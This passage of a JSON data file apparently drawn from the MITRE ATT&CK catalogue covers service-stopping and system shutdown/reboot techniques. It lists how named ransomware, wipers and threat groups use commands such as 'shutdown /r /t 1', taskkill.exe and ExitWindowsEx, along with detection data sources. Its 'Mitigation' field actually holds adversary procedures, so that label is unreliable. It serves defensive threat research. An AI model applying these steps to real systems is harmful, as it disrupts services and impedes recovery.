        "description": "REvil has the capability to stop services and kill processes.[35][36]"
      },
      {
        "id": "S0400",
        "name": "RobbinHood",
        "description": "RobbinHood stops 181 Windows services on the system before beginning the encryption process.[37]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can use RmShutDown to kill  applications and services using the resources that are targeted for encryption.[38]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has called kill.bat for stopping services, disabling services and killing processes.[39]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has the capability to stop processes and services.[40]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores.[41][3]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.[42]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may stop or disable services on a system to render those services unavailable to legitimate users."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may stop or disable services on a system to render those services unavailable to legitimate users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, ChangeServiceConfigW may be used by an adversary to prevent services from starting.[1]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may stop or disable services on a system to render those services unavailable to legitimate users."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Termination",
        "detects": "Monitor processes and command-line arguments to see if critical processes are terminated or stop running."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "Alterations to the service binary path or the service startup type changed to disabled may be suspicious."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may stop or disable services on a system to render those services unavailable to legitimate users."
      }
    ],
    "Subtechniques": "\nImpact"
  },
  {
    "Title": "System Shutdown/Reboot",
    "Code": "T1529",
    "Description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).[1][2]Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.[3][4]",
    "Mitigation": [
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR.[5]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.[6]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker’s Linux variant has terminated ESXi virtual machines.[7]"
      },
      {
        "id": "S1033",
        "name": "DCSrv",
        "description": "DCSrv has a function to sleep for two hours before rebooting the system.[8]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can initiate a system shutdown.[9][10]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk attempts to reboot the machine by terminating specific processes.[11]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems.[12]"
      },
      {
        "id": "S0372",
        "name": "LockerGoga",
        "description": "LockerGoga has been observed shutting down infected systems.[13]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack can shutdown and reboot the victim machine.[14]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM.[15]"
      },
      {
        "id": "S0368",
        "name": "NotPetya",
        "description": "NotPetya will reboot the system one hour after infection.[3][16]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer will shut down the compromised system after it is done modifying system configuration settings.[4][16]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon will reboot the infected system once the wiping functionality has been completed.[17][18]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can shutdown a compromised host through execution of ExitWindowsEx with the EXW_SHUTDOWN flag.[19]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments of binaries involved in shutting down or rebooting systems. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes of binaries involved in shutting down or rebooting systems."
      },
      {
        "id": "DS0013",
        "dsource": "Sensor Health",
        "dcomp": "Host Status",
        "detects": "Monitor for logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications) that may suggest the shutting down or rebooting of the system. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006."
      }
    ],
    "Subtechniques": "\nImpact"
  }
]
